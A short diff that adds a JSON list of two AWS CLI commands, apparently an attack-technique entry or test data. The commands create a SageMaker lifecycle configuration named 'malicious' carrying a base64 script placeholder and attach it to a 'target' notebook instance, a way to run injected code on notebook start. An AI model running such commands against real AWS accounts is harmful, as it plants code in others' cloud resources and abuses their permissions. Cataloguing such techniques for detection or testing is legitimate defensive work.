@@ -1,0 +1,4 @@
+[
+  "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name malicious --on-start Content=$base64_script",
+  "aws sagemaker update-notebook-instance --notebook-instance-name target --lifecycle-config-name malicious"
+]
